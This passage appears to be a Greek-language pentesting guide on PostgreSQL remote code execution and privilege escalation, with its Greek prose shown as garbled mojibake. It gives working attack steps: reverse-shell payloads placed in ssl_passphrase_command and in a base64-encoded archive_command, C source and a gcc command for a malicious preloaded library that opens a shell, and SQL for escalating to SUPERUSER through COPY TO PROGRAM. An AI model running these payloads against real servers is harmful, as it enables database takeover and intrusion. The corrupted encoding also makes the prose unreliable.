Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ [Î³Î¹Î± Î±Ï…Ï„Î® Ï„Î·Î½ Ï„ÎµÏ‡Î½Î¹ÎºÎ® ÎµÎ´Ï](https://pulsesecurity.co.nz/articles/postgres-sqli).

Î¤Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ‰Î½ Î­Ï‡ÎµÎ¹ Î¼ÎµÏÎ¹ÎºÎ¬ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½Ï„Î± Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÎ¬ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î¿Î´Î·Î³Î®ÏƒÎ¿Ï…Î½ ÏƒÎµ RCE:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Î”Î¹Î±Î´ÏÎ¿Î¼Î® Ï€ÏÎ¿Ï‚ Ï„Î¿ Î¹Î´Î¹Ï‰Ï„Î¹ÎºÏŒ ÎºÎ»ÎµÎ¹Î´Î¯ Ï„Î·Ï‚ Î²Î¬ÏƒÎ·Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½
* `ssl_passphrase_command = ''` Î•Î¬Î½ Ï„Î¿ Î¹Î´Î¹Ï‰Ï„Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏÎµÏ„Î±Î¹ Î±Ï€ÏŒ ÎºÏ‰Î´Î¹ÎºÏŒ (ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î¿), Ï„Î¿ postgresql Î¸Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® Ï€Î¿Ï… Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÏ„Î±Î¹ ÏƒÎµ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ**.
* `ssl_passphrase_command_supports_reload = off` **Î•Î¬Î½** Î±Ï…Ï„ÏŒ Ï„Î¿ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ ÎµÎ¯Î½Î±Î¹ **ÎµÎ½ÎµÏÎ³ÏŒ**, Î· **ÎµÎ½Ï„Î¿Î»Î®** Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÎµÎ¬Î½ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏÎµÏ„Î±Î¹ Î±Ï€ÏŒ ÎºÏ‰Î´Î¹ÎºÏŒ **Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹** ÏŒÏ„Î±Î½ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Ï„Î¿ `pg_reload_conf()`.

Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î±:

1. **Î•Î¾Î¬Î³ÎµÎ¹ Ï„Î¿ Î¹Î´Î¹Ï‰Ï„Î¹ÎºÏŒ ÎºÎ»ÎµÎ¹Î´Î¯** Î±Ï€ÏŒ Ï„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®
2. **ÎšÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î®ÏƒÎµÎ¹** Ï„Î¿ ÎºÎ±Ï„ÎµÎ²Î±ÏƒÎ¼Î­Î½Î¿ Î¹Î´Î¹Ï‰Ï„Î¹ÎºÏŒ ÎºÎ»ÎµÎ¹Î´Î¯:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Î•Ï€Î¹ÎºÎ±Î»ÏÏˆÎµÎ¹**
4. **Î•Î¾Î¬Î³ÎµÎ¹** Ï„Î·Î½ Ï„ÏÎ­Ï‡Î¿Ï…ÏƒÎ± **ÏÏÎ¸Î¼Î¹ÏƒÎ·** Ï„Î¿Ï… postgresql
5. **Î•Ï€Î¹ÎºÎ±Î»ÏÏˆÎµÎ¹** Ï„Î· **ÏÏÎ¸Î¼Î¹ÏƒÎ·** Î¼Îµ Ï„Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· Ï„Ï‰Î½ Î±Î½Î±Ï†ÎµÏÏŒÎ¼ÎµÎ½Ï‰Î½ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏÎ½:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Î•ÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ `pg_reload_conf()`

ÎšÎ±Ï„Î¬ Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î± Ï„Î·Ï‚ Î´Î¿ÎºÎ¹Î¼Î®Ï‚ Î±Ï…Ï„Î¿Ï, Ï€Î±ÏÎ±Ï„Î®ÏÎ·ÏƒÎ± ÏŒÏ„Î¹ Î±Ï…Ï„ÏŒ Î¸Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î¼ÏŒÎ½Î¿ ÎµÎ¬Î½ Ï„Î¿ **Î¹Î´Î¹Ï‰Ï„Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï Î­Ï‡ÎµÎ¹ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± 640**, ÎµÎ¯Î½Î±Î¹ **ÎºÎ±Ï„Î¿Ï‡Ï…ÏÏ‰Î¼Î­Î½Î¿ Î±Ï€ÏŒ Ï„Î¿Î½ root** ÎºÎ±Î¹ Î±Ï€ÏŒ Ï„Î·Î½ **Î¿Î¼Î¬Î´Î± ssl-cert Î® postgres** (Î­Ï„ÏƒÎ¹ ÏÏƒÏ„Îµ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ postgres Î½Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï„Î¿ Î´Î¹Î±Î²Î¬ÏƒÎµÎ¹), ÎºÎ±Î¹ ÎµÎ¯Î½Î±Î¹ Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î·Î¼Î­Î½Î¿ ÏƒÏ„Î¿ _/var/lib/postgresql/12/main_.

#### **RCE Î¼Îµ archive\_command**

**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚** [**Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Î±Ï…Ï„Î® Ï„Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· ÎºÎ±Î¹ Î³Î¹Î± Ï„Î¿ WAL ÎµÎ´Ï**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

ÎˆÎ½Î± Î¬Î»Î»Î¿ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ‰Î½ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎ¹Î¼Î¿ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ `archive_command`.

Î“Î¹Î± Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î±Ï…Ï„ÏŒ, Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· `archive_mode` Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¯Î½Î±Î¹ `'on'` Î® `'always'`. Î•Î¬Î½ Î±Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Î±Î»Î·Î¸Î­Ï‚, Ï„ÏŒÏ„Îµ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î¼Îµ Î½Î± ÎµÏ€Î¹ÎºÎ±Î»ÏÏˆÎ¿Ï…Î¼Îµ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® ÏƒÏ„Î¿ `archive_command` ÎºÎ±Î¹ Î½Î± Ï„Î·Î½ Î±Î½Î±Î³ÎºÎ¬ÏƒÎ¿Ï…Î¼Îµ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î¼Î­ÏƒÏ‰ Ï„Ï‰Î½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÏÎ½ WAL (write-ahead logging).

Î¤Î± Î³ÎµÎ½Î¹ÎºÎ¬ Î²Î®Î¼Î±Ï„Î± ÎµÎ¯Î½Î±Î¹:

1. Î•Î»Î­Î³Î¾Ï„Îµ ÎµÎ¬Î½ Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Î±ÏÏ‡ÎµÎ¯Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î·: `SELECT current_setting('archive_mode')`
2. Î•Ï€Î¹ÎºÎ±Î»ÏÏˆÏ„Îµ Ï„Î¿ `archive_command` Î¼Îµ Ï„Î¿ payload. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î¼Î¹Î± Î±Î½Ï„Î¯ÏƒÏ„ÏÎ¿Ï†Î· Î¸Î®ÎºÎ·: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Î•Ï€Î±Î½Î±Ï†Î¿ÏÏ„ÏÏƒÏ„Îµ Ï„Î· ÏÏÎ¸Î¼Î¹ÏƒÎ·: `SELECT pg_reload_conf()`
4. Î‘Î½Î±Î³ÎºÎ¬ÏƒÏ„Îµ Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± WAL Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹, Î· Î¿Ï€Î¿Î¯Î± Î¸Î± ÎºÎ±Î»Î­ÏƒÎµÎ¹ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® Î±ÏÏ‡ÎµÎ¯Î¿Ï…: `SELECT pg_switch_wal()` Î® `SELECT pg_switch_xlog()` Î³Î¹Î± Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ Postgres

#### **RCE Î¼Îµ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ Ï€ÏÎ¿Ï†ÏŒÏÏ„Ï‰ÏƒÎ·Ï‚**

Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ [Î³Î¹Î± Î±Ï…Ï„Î® Ï„Î·Î½ Ï„ÎµÏ‡Î½Î¹ÎºÎ® ÎµÎ´Ï](https://adeadfed.com/posts/postgresql-select-only-rce/).

Î‘Ï…Ï„ÏŒÏ‚ Î¿ ÎµÏ€Î¹Î¸ÎµÏ„Î¹ÎºÏŒÏ‚ Î´Î¹Î±Î½ÏÏƒÎ¼Î±Ï„Î¿Ï‚ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎµÏ„Î±Î¹ Ï„Î¹Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏÏ…Î¸Î¼Î¹ÏƒÏ„Î¹ÎºÎ­Ï‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚:

* `session_preload_libraries` -- Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ Ï€Î¿Ï… Î¸Î± Ï†Î¿ÏÏ„Ï‰Î¸Î¿ÏÎ½ Î±Ï€ÏŒ Ï„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® PostgreSQL ÎºÎ±Ï„Î¬ Ï„Î· ÏƒÏÎ½Î´ÎµÏƒÎ· Ï„Î¿Ï… Ï€ÎµÎ»Î¬Ï„Î·.
* `dynamic_library_path` -- Î»Î¯ÏƒÏ„Î± ÎºÎ±Ï„Î±Î»ÏŒÎ³Ï‰Î½ ÏŒÏ€Î¿Ï… Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ PostgreSQL Î¸Î± Î±Î½Î±Î¶Î·Ï„Î®ÏƒÎµÎ¹ Ï„Î¹Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚.

ÎœÏ€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Î¿ÏÎ¯ÏƒÎ¿Ï…Î¼Îµ Ï„Î·Î½ Ï„Î¹Î¼Î® `dynamic_library_path` ÏƒÎµ Î­Î½Î±Î½ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿, Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÎµÎ³Î³ÏÎ¬ÏˆÎ¹Î¼Î¿Ï‚ Î±Ï€ÏŒ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· `postgres` Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½, Ï€.Ï‡., ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ `/tmp/`, ÎºÎ±Î¹ Î½Î± Î±Î½ÎµÎ²Î¬ÏƒÎ¿Ï…Î¼Îµ Î­Î½Î± ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ `.so` ÎµÎºÎµÎ¯. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î¸Î± Î±Î½Î±Î³ÎºÎ¬ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® PostgreSQL Î½Î± Ï†Î¿ÏÏ„ÏÏƒÎµÎ¹ Ï„Î· Î½Î­Î± Î¼Î±Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Î½Ï„Î¬Ï‚ Ï„Î·Î½ ÏƒÏ„Î· Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® `session_preload_libraries`.

Î¤Î± Î²Î®Î¼Î±Ï„Î± Ï„Î·Ï‚ ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚ ÎµÎ¯Î½Î±Î¹:

1. ÎšÎ±Ï„ÎµÎ²Î¬ÏƒÏ„Îµ Ï„Î¿ Î±ÏÏ‡Î¹ÎºÏŒ `postgresql.conf`
2. Î£Ï…Î¼Ï€ÎµÏÎ¹Î»Î¬Î²ÎµÏ„Îµ Ï„Î¿Î½ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ `/tmp/` ÏƒÏ„Î·Î½ Ï„Î¹Î¼Î® `dynamic_library_path`, Ï€.Ï‡. `dynamic_library_path = '/tmp:$libdir'`
3. Î£Ï…Î¼Ï€ÎµÏÎ¹Î»Î¬Î²ÎµÏ„Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î·Ï‚ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î·Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ·Ï‚ ÏƒÏ„Î·Î½ Ï„Î¹Î¼Î® `session_preload_libraries`, Ï€.Ï‡. `session_preload_libraries = 'payload.so'`
4. Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î·Î½ ÎºÏÏÎ¹Î± Î­ÎºÎ´Î¿ÏƒÎ· PostgreSQL Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… ÎµÏÏ‰Ï„Î®Î¼Î±Ï„Î¿Ï‚ `SELECT version()`
5.  Î£Ï…Î³ÎºÎµÎ½Ï„ÏÏÏƒÏ„Îµ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï„Î·Ï‚ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î·Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ·Ï‚ Î¼Îµ Ï„Î¿ ÏƒÏ‰ÏƒÏ„ÏŒ Ï€Î±ÎºÎ­Ï„Î¿ Î±Î½Î¬Ï€Ï„Ï…Î¾Î·Ï‚ PostgreSQL Î”ÎµÎ¯Î³Î¼Î± ÎºÏÎ´Î¹ÎºÎ±:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï€Î¿Ï… ÎµÎ»Î®Ï†Î¸Î· Î±Ï€ÏŒ https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Î£Ï…Î³ÎºÎ­Î½Ï„ÏÏ‰ÏƒÎ· Ï„Î¿Ï… ÎºÏÎ´Î¹ÎºÎ±:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```
6. Î‘Î½ÎµÎ²Î¬ÏƒÏ„Îµ Ï„Î¿ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ `postgresql.conf`, Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®Î¸Î·ÎºÎµ ÏƒÏ„Î± Î²Î®Î¼Î±Ï„Î± 2-3, ÎºÎ±Î¹ ÎµÏ€Î¹ÎºÎ±Î»ÏÏˆÏ„Îµ Ï„Î¿ Î±ÏÏ‡Î¹ÎºÏŒ
7. Î‘Î½ÎµÎ²Î¬ÏƒÏ„Îµ Ï„Î¿ `payload.so` Î±Ï€ÏŒ Ï„Î¿ Î²Î®Î¼Î± 5 ÏƒÏ„Î¿Î½ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ `/tmp`
8. Î•Ï€Î±Î½Î±Ï†Î¿ÏÏ„ÏÏƒÏ„Îµ Ï„Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® ÎµÏ€Î±Î½ÎµÎºÎºÎ¹Î½ÏÎ½Ï„Î±Ï‚ Ï„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Î® ÎºÎ±Î»ÏÎ½Ï„Î±Ï‚ Ï„Î¿ ÎµÏÏÏ„Î·Î¼Î± `SELECT pg_reload_conf()`
9. Î£Ï„Î· ÎµÏ€ÏŒÎ¼ÎµÎ½Î· ÏƒÏÎ½Î´ÎµÏƒÎ· DB, Î¸Î± Î»Î¬Î²ÎµÏ„Îµ Ï„Î· ÏƒÏÎ½Î´ÎµÏƒÎ· Î±Î½Ï„Î¯ÏƒÏ„ÏÎ¿Ï†Î·Ï‚ Î¸Î®ÎºÎ·Ï‚.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

Î£ÏÎ¼Ï†Ï‰Î½Î± Î¼Îµ Ï„Î± [**Î­Î³Î³ÏÎ±Ï†Î±**](https://www.postgresql.org/docs/13/sql-grant.html): _ÎŸÎ¹ ÏÏŒÎ»Î¿Î¹ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ **`CREATEROLE`** Î´Î¹ÎºÎ±Î¯Ï‰Î¼Î± Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± **Ï€Î±ÏÎ±Ï‡Ï‰ÏÎ®ÏƒÎ¿Ï…Î½ Î® Î½Î± Î±Î½Î±ÎºÎ±Î»Î­ÏƒÎ¿Ï…Î½ Ï„Î·Î½ Î¹Î´Î¹ÏŒÏ„Î·Ï„Î± Î¼Î­Î»Î¿Ï…Ï‚ ÏƒÎµ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ ÏÏŒÎ»Î¿** Ï€Î¿Ï… **Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹** superuser._

ÎˆÏ„ÏƒÎ¹, Î±Î½ Î­Ï‡ÎµÏ„Îµ **`CREATEROLE`** Î¬Î´ÎµÎ¹Î±, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€Î±ÏÎ±Ï‡Ï‰ÏÎ®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¬Î»Î»Î¿Ï…Ï‚ **ÏÏŒÎ»Î¿Ï…Ï‚** (Ï€Î¿Ï… Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ superuser) Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÏƒÎ±Ï‚ Î´ÏÏƒÎ¿Ï…Î½ Ï„Î·Î½ ÎµÏ€Î¹Î»Î¿Î³Î® Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ & Î³ÏÎ¬ÏˆÎµÏ„Îµ Î±ÏÏ‡ÎµÎ¯Î± ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ ÎµÎ½Ï„Î¿Î»Î­Ï‚:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Modify Password

ÎŸÎ¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î¼Îµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ ÏÏŒÎ»Î¿ Î¼Ï€Î¿ÏÎ¿ÏÎ½ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± **Î±Î»Î»Î¬Î¾Î¿Ï…Î½** Ï„Î¿Ï…Ï‚ **ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚** Î¬Î»Î»Ï‰Î½ **Î¼Î· Ï…Ï€ÎµÏÏ‡ÏÎ·ÏƒÏ„ÏÎ½**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

Î•Î¯Î½Î±Î¹ Î±ÏÎºÎµÏ„Î¬ ÏƒÏ…Î½Î·Î¸Î¹ÏƒÎ¼Î­Î½Î¿ Î½Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÏÎ½ÎµÎ¹ ÎºÎ±Î½ÎµÎ¯Ï‚ ÏŒÏ„Î¹ **Î¿Î¹ Ï„Î¿Ï€Î¹ÎºÎ¿Î¯ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸Î¿ÏÎ½ ÏƒÏ„Î¿ PostgreSQL Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Ï€Î±ÏÎ­Ï‡Î¿Ï…Î½ ÎºÎ±Î½Î­Î½Î±Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚**. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î¼ÏŒÎ»Î¹Ï‚ Î­Ï‡ÎµÏ„Îµ ÏƒÏ…Î³ÎºÎµÎ½Ï„ÏÏÏƒÎµÎ¹ **Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ ÎºÏÎ´Î¹ÎºÎ±** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î±Ï…Ï„Î¬ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î³Î¹Î± Î½Î± ÏƒÎ±Ï‚ Ï€Î±ÏÎ±Ï‡Ï‰ÏÎ·Î¸ÎµÎ¯ Î¿ ÏÏŒÎ»Î¿Ï‚ **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î´Ï…Î½Î±Ï„ÏŒ Î»ÏŒÎ³Ï‰ Ï„Ï‰Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î³ÏÎ±Î¼Î¼ÏÎ½ ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ **`pg_hba.conf`**:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE privesc**

Î£Ï„Î¿ [**Î±Ï…Ï„ÏŒ Ï„Î¿ Î¬ÏÎ¸ÏÎ¿**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) ÎµÎ¾Î·Î³ÎµÎ¯Ï„Î±Î¹ Ï€ÏÏ‚ Î®Ï„Î±Î½ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î³Î¯Î½ÎµÎ¹ **privesc** ÏƒÏ„Î¿ Postgres GCP ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Î¹ Ï„Î¿ Î´Î¹ÎºÎ±Î¯Ï‰Î¼Î± ALTER TABLE Ï€Î¿Ï… ÎµÎ¯Ï‡Îµ Ï€Î±ÏÎ±Ï‡Ï‰ÏÎ·Î¸ÎµÎ¯ ÏƒÏ„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î·.

ÎŒÏ„Î±Î½ Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯Ï„Îµ Î½Î± **ÎºÎ¬Î½ÎµÏ„Îµ Î­Î½Î±Î½ Î¬Î»Î»Î¿ Ï‡ÏÎ®ÏƒÏ„Î· Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„Î· ÎµÎ½ÏŒÏ‚ Ï€Î¯Î½Î±ÎºÎ±**, Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î»Î¬Î²ÎµÏ„Îµ Î­Î½Î± **ÏƒÏ†Î¬Î»Î¼Î±** Ï€Î¿Ï… Î½Î± Ï„Î¿ Î±Ï€Î¿Ï„ÏÎ­Ï€ÎµÎ¹, Î±Î»Î»Î¬ Ï€ÏÎ¿Ï†Î±Î½ÏÏ‚ Ï„Î¿ GCP Î­Î´Ï‰ÏƒÎµ Î±Ï…Ï„Î® Ï„Î·Î½ **ÎµÏ€Î¹Î»Î¿Î³Î® ÏƒÏ„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· postgres Ï€Î¿Ï… Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ superuser** ÏƒÏ„Î¿ GCP:

<figure><img src="../.gitbook/assets/image (537).png" alt=""><figcaption></figcaption></figure>

